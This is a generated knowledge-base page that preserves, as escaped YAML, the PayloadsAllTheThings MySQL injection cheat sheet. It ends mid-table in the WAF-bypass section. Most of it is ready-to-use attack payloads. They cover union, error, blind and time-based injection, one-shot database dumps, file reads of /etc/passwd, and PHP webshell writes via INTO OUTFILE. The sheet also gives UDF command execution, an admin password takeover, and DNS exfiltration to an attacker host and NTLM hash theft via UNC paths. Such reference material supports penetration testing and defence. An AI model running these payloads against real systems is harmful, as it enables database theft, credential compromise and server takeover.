---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# MySQL Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-sql-injection-mysql-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/MySQL Injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MySQL Injection](../../topics/sql-injection/mysql-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-sql-injection-mysql-injection |
| name | MySQL Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md |

## Preserved Source Material

````yaml
_body: "# MySQL Injection\n\n> MySQL Injection  is a type of security vulnerability that occurs when an attacker is able to\
  \ manipulate the SQL queries made to a MySQL database by injecting malicious input. This vulnerability is often the result\
  \ of improperly handling user input, allowing attackers to execute arbitrary SQL code that can compromise the database's\
  \ integrity and security.\n\n## Summary\n\n* [MYSQL Default Databases](#mysql-default-databases)\n* [MYSQL Comments](#mysql-comments)\n\
  * [MYSQL Testing Injection](#mysql-testing-injection)\n* [MYSQL Union Based](#mysql-union-based)\n    * [Detect Columns\
  \ Number](#detect-columns-number)\n        * [Iterative NULL Method](#iterative-null-method)\n        * [ORDER BY Method](#order-by-method)\n\
  \        * [LIMIT INTO Method](#limit-into-method)\n    * [Extract Database With Information_schema](#extract-database-with-information_schema)\n\
  \    * [Extract Columns Name Without Information_Schema](#extract-columns-name-without-information_schema)\n    * [Extract\
  \ Data Without Columns Name](#extract-data-without-columns-name)\n* [MYSQL Error Based](#mysql-error-based)\n    * [MYSQL\
  \ Error Based - Basic](#mysql-error-based---basic)\n    * [MYSQL Error Based - UpdateXML Function](#mysql-error-based---updatexml-function)\n\
  \    * [MYSQL Error Based - Extractvalue Function](#mysql-error-based---extractvalue-function)\n* [MYSQL Blind](#mysql-blind)\n\
  \    * [MYSQL Blind With Substring Equivalent](#mysql-blind-with-substring-equivalent)\n    * [MYSQL Blind Using A Conditional\
  \ Statement](#mysql-blind-using-a-conditional-statement)\n    * [MYSQL Blind With MAKE_SET](#mysql-blind-with-make_set)\n\
  \    * [MYSQL Blind With LIKE](#mysql-blind-with-like)\n    * [MySQL Blind With REGEXP](#mysql-blind-with-regexp)\n* [MYSQL\
  \ Time Based](#mysql-time-based)\n    * [Using SLEEP in a Subselect](#using-sleep-in-a-subselect)\n    * [Using Conditional\
  \ Statements](#using-conditional-statements)\n* [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)\n* [MYSQL\
  \ Current Queries](#mysql-current-queries)\n* [MYSQL Read Content of a File](#mysql-read-content-of-a-file)\n* [MYSQL Command\
  \ Execution](#mysql-command-execution)\n    * [WEBSHELL - OUTFILE method](#webshell---outfile-method)\n    * [WEBSHELL -\
  \ DUMPFILE method](#webshell---dumpfile-method)\n    * [COMMAND - UDF Library](#command---udf-library)\n* [MYSQL INSERT](#mysql-insert)\n\
  * [MYSQL Truncation](#mysql-truncation)\n* [MYSQL Out of Band](#mysql-out-of-band)\n    * [DNS Exfiltration](#dns-exfiltration)\n\
  \    * [UNC Path - NTLM Hash Stealing](#unc-path---ntlm-hash-stealing)\n* [MYSQL WAF Bypass](#mysql-waf-bypass)\n    * [Alternative\
  \ to Information Schema](#alternative-to-information-schema)\n    * [Alternative to VERSION](#alternative-to-version)\n\
  \    * [Alternative to GROUP_CONCAT](#alternative-to-group_concat)\n    * [Scientific Notation](#scientific-notation)\n\
  \    * [Conditional Comments](#conditional-comments)\n    * [Wide Byte Injection (GBK)](#wide-byte-injection-gbk)\n* [References](#references)\n\
  \n## MYSQL Default Databases\n\n| Name               | Description              |\n|--------------------|--------------------------|\n\
  | mysql              | Requires root privileges |\n| information_schema | Available from version 5 and higher |\n\n## MYSQL\
  \ Comments\n\nMySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.\n\n| Type\
  \                       | Description                       |\n|----------------------------|-----------------------------------|\n\
  | `#`                        | Hash comment                      |\n| `/* MYSQL Comment */`      | C-style comment     \
  \              |\n| `/*! MYSQL Special SQL */` | Special SQL                       |\n| `/*!32302 10*/`            | Comment\
  \ for MYSQL version 3.23.02 |\n| `--`                       | SQL comment                       |\n| `;%00`            \
  \         | Nullbyte                          |\n| \\`                         | Backtick                          |\n\n\
  ## MYSQL Testing Injection\n\n* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`\n\n    ```ps1\n    ' False\n\
  \    '' True\n    \" False\n    \"\" True\n    \\ False\n    \\\\ True\n    ```\n\n* **Numeric**: Query like `SELECT * FROM\
  \ Table WHERE id = FUZZ;`\n\n    ```ps1\n    AND 1     True\n    AND 0     False\n    AND true True\n    AND false False\n\
  \    1-false     Returns 1 if vulnerable\n    1-true     Returns 0 if vulnerable\n    1*56     Returns 56 if vulnerable\n\
  \    1*56     Returns 1 if not vulnerable\n    ```\n\n* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1'\
  \ AND password = 'FUZZ2';`\n\n    ```ps1\n    ' OR '1\n    ' OR 1 -- -\n    \" OR \"\" = \"\n    \" OR 1 = 1 -- -\n    '='\n\
  \    'LIKE'\n    '=0--+\n    ```\n\n## MYSQL Union Based\n\n### Detect Columns Number\n\nTo successfully perform a union-based\
  \ SQL injection, an attacker needs to know the number of columns in the original query.\n\n#### Iterative NULL Method\n\n\
  Systematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors\
  \ or produces a visible change. Each iteration checks the compatibility of the column count.\n\n```sql\nUNION SELECT NULL;--\n\
  UNION SELECT NULL, NULL;-- \nUNION SELECT NULL, NULL, NULL;-- \n```\n\n#### ORDER BY Method\n\nKeep incrementing the number\
  \ until you get a `False` response. Even though `GROUP BY` and `ORDER BY` have different functionality in SQL, they both\
  \ can be used in the exact same fashion to determine the number of columns in the query.\n\n| ORDER BY        | GROUP BY\
  \        | Result |\n| --------------- | --------------- | ------ |\n| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |\n| `ORDER\
  \ BY 2--+` | `GROUP BY 2--+` | True   |\n| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |\n| `ORDER BY 4--+` | `GROUP BY 4--+`\
  \ | False  |\n\nSince the result is false for `ORDER BY 4`, it means the SQL query is only having 3 columns.\nIn the `UNION`\
  \ based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.\n\nSimilar to\
  \ the previous method, we can check the number of columns with one request if error showing is enabled.\n\n```sql\nORDER\
  \ BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+\
  \ # Unknown column '4' in 'order clause'\n```\n\n#### LIMIT INTO Method\n\nThis method is effective when error reporting\
  \ is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.\n\
  \n| Payload                      | Error           |\n| ---------------------------- | --------------- |\n| `1' LIMIT 1,1\
  \ INTO @--+`     | `The used SELECT statements have a different number of columns` |\n| `1' LIMIT 1,1 INTO @,@--+`  | `The\
  \ used SELECT statements have a different number of columns` |\n| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses\
  \ 3 columns` |\n\nSince the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.\n\
  \n### Extract Database With Information_Schema\n\nThis query retrieves the names of all schemas (databases) on the server.\n\
  \n```sql\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata\n```\n\nThis query\
  \ retrieves the names of all tables within a specified schema (the schema name is represented by PLACEHOLDER).\n\n```sql\n\
  UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER\n\
  ```\n\nThis query retrieves the names of all columns in a specified table.\n\n```sql\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C)\
  \ FROM information_schema.columns WHERE table_name=...\n```\n\nThis query aims to retrieve data from a specific table.\n\
  \n```sql\nUNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...\n```\n\n### Extract Columns Name Without Information_Schema\n\
  \nMethod for `MySQL >= 4.1`.\n\n| Payload | Output |\n| --- | --- |\n| `(1)and(SELECT * from db.users)=(1)` | Operand should\
  \ contain **4** column(s) |\n| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**'\
  \ cannot be null |\n\nMethod for `MySQL 5`\n\n| Payload | Output |\n| --- | --- |\n| `UNION SELECT * FROM (SELECT * FROM\
  \ users JOIN users b)a` | Duplicate column name '**id**' |\n| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`\
  \ | Duplicate column name '**name**' |\n| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data\
  \ |\n\n### Extract Data Without Columns Name\n\nExtracting data from the 4th column without knowing its name.\n\n```sql\n\
  SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;\n```\n\nInjection example inside the query `select\
  \ author_id,title from posts where author_id=[INJECT_HERE]`\n\n```sql\nMariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS\
  \ WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT\
  \ 1,1);\n+-----------+-----------------------------------------------------------------+\n| author_id | title          \
  \                                                 |\n+-----------+-----------------------------------------------------------------+\n\
  |         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |\n+-----------+-----------------------------------------------------------------+\n\
  ```\n\n## MYSQL Error Based\n\n| Name         | Payload         |\n| ------------ | --------------- |\n| GTID_SUBSET  |\
  \ `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -` |\n| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT\
  \ CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |\n| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT\
  \ version()),'~')) -- -` |\n| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -` |\n\
  | EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -` |\n| OR           | `OR\
  \ 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -` |\n| NAME_CONST   | `AND (SELECT *\
  \ FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--` |\n| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1`\
  \ |\n\n### MYSQL Error Based - Basic\n\nWorks with `MySQL >= 4.1`\n\n```sql\n(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X\
  \ FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))\n'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X\
  \ FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'\n```\n\n### MYSQL Error Based - UpdateXML Function\n\n```sql\n\
  AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126))\
  \ FROM information_schema.schemata LIMIT data_offset,1)),null)--\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126))\
  \ FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT\
  \ CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--\n\
  AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--\n\
  ```\n\nShorter to read:\n\n```sql\nUPDATEXML(null,CONCAT(0x0a,version()),null)-- -\nUPDATEXML(null,CONCAT(0x0a,(select table_name\
  \ from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -\n```\n\n### MYSQL Error Based - Extractvalue\
  \ Function\n\nWorks with `MySQL >= 5.1`\n\n```sql\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--\n\
  ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata\
  \ LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM\
  \ information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT\
  \ CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--\n\
  ?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT\
  \ data_offset,1)))--\n```\n\n### MYSQL Error Based - NAME_CONST function (only for constants)\n\nWorks with `MySQL >= 5.0`\n\
  \n```sql\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--\n?id=1 AND (SELECT *\
  \ FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1))\
  \ as x)--\n```\n\n## MYSQL Blind\n\n### MYSQL Blind With Substring Equivalent\n\n| Function | Example | Description |\n\
  | --- | --- | --- |\n| `SUBSTR` | `SUBSTR(version(),1,1)=5` | Extracts a substring from a string (starting at any position)\
  \ |\n| `SUBSTRING` | `SUBSTRING(version(),1,1)=5` | Extracts a substring from a string (starting at any position) |\n| `RIGHT`\
  \ | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |\n| `MID` | `MID(version(),1,1)=4`\
  \ | Extracts a substring from a string (starting at any position) |\n| `LEFT` | `LEFT(version(),1)=4` | Extracts a number\
  \ of characters from a string (starting from left) |\n\nExamples of Blind SQL injection using `SUBSTRING` or another equivalent\
  \ function:\n\n```sql\n?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'\n?id=1 AND SELECT SUBSTR(column_name,1,1)\
  \ FROM information_schema.columns > 'A'\n?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51\n```\n\n### MYSQL Blind Using\
  \ a Conditional Statement\n\n* TRUE: `if @@version starts with a 5`:\n\n    ```sql\n    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n\
  \    Response:\n    HTTP/1.1 500 Internal Server Error\n    ```\n\n* FALSE: `if @@version starts with a 4`:\n\n    ```sql\n\
  \    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2\n    Response:\n    HTTP/1.1 200 OK\n    ```\n\n### MYSQL Blind\
  \ With MAKE_SET\n\n```sql\nAND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)\nAND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)\n\
  AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)\nAND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)\n\
  ```\n\n### MYSQL Blind With LIKE\n\nIn MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The\
  \ operator allows the use of wildcard characters to match unknown or partial string values. This is especially useful in\
  \ a blind SQL injection context when an attacker does not know the length or specific content of the data stored in the\
  \ database.\n\nWildcard Characters in LIKE:\n\n* **Percentage Sign** (`%`): This wildcard represents zero, one, or multiple\
  \ characters. It can be used to match any sequence of characters.\n* **Underscore** (`_`): This wildcard represents a single\
  \ character. It's used for more precise matching when you know the structure of the data but not the specific character\
  \ at a particular position.\n\n```sql\nSELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';\nSELECT * FROM products\
  \ WHERE product_name LIKE '%user_input%'\n```\n\n### MySQL Blind with REGEXP\n\nBlind SQL injection can also be performed\
  \ using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is\
  \ particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.\n\
  \n| Payload | Description |\n| --- | --- |\n| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking\
  \ length |\n| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits\
  \ |\n| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by \"a\" |\n\n\
  ## MYSQL Time Based\n\nThe following SQL codes will delay the output from MySQL.\n\n* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)\n\
  \n    ```sql\n    +BENCHMARK(40000000,SHA1(1337))+\n    '+BENCHMARK(3200,SHA1(1))+'\n    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))\n\
  \    ```\n\n* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)\n\
  \n    ```sql\n    RLIKE SLEEP([SLEEPTIME])\n    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))\n    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR\n\
  \    AND SLEEP(10)=0\n    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)\n    ```\n\n### Using SLEEP\
  \ in a Subselect\n\nExtracting the length of the data.\n\n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE\
  \ '%')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# \n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE()\
  \ LIKE '____')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#\n```\n\nExtracting the first character.\n\
  \n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE()\
  \ LIKE 'S____')#\n```\n\nExtracting the second character.\n\n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE()\
  \ LIKE 'SA___')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#\n```\n\nExtracting the third character.\n\
  \n```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE()\
  \ LIKE 'SWB__')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#\n```\n\nExtracting column_name.\n\n\
  ```sql\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE()\
  \ AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#\n```\n\n### Using Conditional Statements\n\n```sql\n?id=1 AND IF(ASCII(SUBSTRING((SELECT\
  \ USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --\n?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1,\
  \ SLEEP(3)) --\n?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n```\n\n## MYSQL DIOS - Dump in One Shot\n\nDIOS (Dump\
  \ In One Shot) SQL Injection is an advanced technique that allows an attacker to extract entire database contents in a single,\
  \ well-crafted SQL injection payload. This method leverages the ability to concatenate multiple pieces of data into a single\
  \ result set, which is then returned in one response from the database.\n\n```sql\n(select (@) from (select(@:=0x00),(select\
  \ (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ]\
  \ > ',table_name,' > ',column_name,0x7C))))a)#\n(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data)\
  \ where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#\n```\n\n* SecurityIdiots\n\
  \n    ```sql\n    make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n\
  \    ```\n\n* Profexer\n\n    ```sql\n    (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)\n\
  \    ```\n\n* Dr.Z3r0\n\n    ```sql\n    (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))\n\
  \    ```\n\n* M@dBl00d\n\n    ```sql\n    (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))\n\
  \    ```\n\n* Zen\n\n    ```sql\n    +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n\
  \    ```\n\n* sharik\n\n    ```sql\n    (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)\n\
  \    ```\n\n## MYSQL Current Queries\n\n`INFORMATION_SCHEMA.PROCESSLIST` is a special table available in MySQL and MariaDB\
  \ that provides information about active processes and threads within the database server. This table can list all operations\
  \ that DB is performing at the moment.\n\nThe `PROCESSLIST` table contains several important columns, each providing details\
  \ about the current processes. Common columns include:\n\n* **ID** : The process identifier.\n* **USER** : The MySQL user\
  \ who is running the process.\n* **HOST** : The host from which the process was initiated.\n* **DB** : The database the\
  \ process is currently accessing, if any.\n* **COMMAND** : The type of command the process is executing (e.g., Query, Sleep).\n\
  * **TIME** : The time in seconds that the process has been running.\n* **STATE** : The current state of the process.\n*\
  \ **INFO** : The text of the statement being executed, or NULL if no statement is being executed.\n\n```sql\nSELECT * FROM\
  \ INFORMATION_SCHEMA.PROCESSLIST;\n```\n\n| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO\
  \ |\n| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |\n| 1   | root   | localhost \
  \       | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |\n| 2   | app_uset  | 192.168.0.101    | appdb\
  \   | Sleep  | 300 | sleeping  | NULL |\n| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting |\
  \ NULL |\n\n```sql\nUNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #\n```\n\nDump in one shot query to\
  \ extract the whole content of the table.\n\n```sql\nUNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4\
  \ #\n```\n\n## MYSQL Read Content of a File\n\nNeed the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000):\
  \ The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`\n\n```sql\nUNION ALL\
  \ SELECT LOAD_FILE('/etc/passwd') --\nUNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));\n```\n\nIf you are\
  \ `root` on the database, you can re-enable the `LOAD_FILE` using the following query\n\n```sql\nGRANT FILE ON *.* TO 'root'@'localhost';\
  \ FLUSH PRIVILEGES;#\n```\n\n## MYSQL Command Execution\n\n### WEBSHELL - OUTFILE Method\n\n```sql\n[...] UNION SELECT \"\
  <?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"\n[...] UNION SELECT '' INTO OUTFILE\
  \ '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'\n[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e\
  \ into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -\n[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\"\
  ,6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'\n```\n\n### WEBSHELL - DUMPFILE Method\n\n```sql\n[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX,\
  \ NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'\n[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e\
  \ INTO DUMPFILE '/var/www/html/images/shell.php';\n```\n\n### COMMAND - UDF Library\n\nFirst you need to check if the UDF\
  \ are installed on the server.\n\n```powershell\n$ whereis lib_mysqludf_sys.so\n/usr/lib/lib_mysqludf_sys.so\n```\n\nThen\
  \ you can use functions such as `sys_exec` and `sys_eval`.\n\n```sql\n$ mysql -u root -p mysql\nEnter password: [...]\n\n\
  mysql> SELECT sys_eval('id');\n+--------------------------------------------------+\n| sys_eval('id') |\n+--------------------------------------------------+\n\
  | uid=118(mysql) gid=128(mysql) groups=128(mysql) |\n+--------------------------------------------------+\n```\n\n## MYSQL\
  \ INSERT\n\n`ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to insert a row\
  \ that already exists in the table. We can use this to change the admin password by:\n\nInject using payload:\n\n```sql\n\
  attacker_dummy@example.com\", \"P@ssw0rd\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\"\
  \ --\n```\n\nThe query would look like this:\n\n```sql\nINSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\"\
  , \"BCRYPT_HASH\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" -- \", \"BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT\"\
  );\n```\n\nThis query will insert a row for the user \"`attacker_dummy@example.com`\". It will also insert a row for the\
  \ user \"`admin@example.com`\".\n\nBecause this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to\
  \ update the `password` column of the already existing row to \"P@ssw0rd\". After this, we can simply authenticate with\
  \ \"`admin@example.com`\" and the password \"P@ssw0rd\".\n\n## MYSQL Truncation\n\nIn MYSQL \"`admin`\" and \"`admin`\"\
  \ are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So\
  \ if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will\
  \ be removed.\n\n```sql\n`username` varchar(20) not null\n```\n\nPayload: `username = \"admin               a\"`\n\n## MYSQL\
  \ Out of Band\n\n```powershell\nSELECT @@version INTO OUTFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt';\nSELECT @@version\
  \ INTO DUMPFILE '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt;\n```\n\n### DNS Exfiltration\n\n```sql\nSELECT LOAD_FILE(CONCAT('\\\
  \\\\\\',VERSION(),'.hacker.site\\\\a.txt'));\nSELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))\n\
  ```\n\n### UNC Path - NTLM Hash Stealing\n\nThe term \"UNC path\" refers to the Universal Naming Convention path used to\
  \ specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments\
  \ to access files over a network using a format like `\\\\server\\share\\file`.\n\n```sql\nSELECT LOAD_FILE('\\\\\\\\error\\\
  \\abc');\nSELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);\nSELECT '' INTO DUMPFILE '\\\\\\\\error\\\\abc';\nSELECT ''\
  \ INTO OUTFILE '\\\\\\\\error\\\\abc';\nLOAD DATA INFILE '\\\\\\\\error\\\\abc' INTO TABLE DATABASE.TABLE_NAME;\n```\n\n\
  :warning: Don't forget to escape the '\\\\\\\\'.\n\n## MYSQL WAF Bypass\n\n### Alternative to Information Schema\n\n`information_schema.tables`\
  \ alternative\n\n```sql\nSELECT * FROM mysql.innodb_table_stats;\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n\
  | database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes\
  \ |\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n\
  | dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                       \
  \ 0 |\n| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                \
  \        0 |\n...\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n\
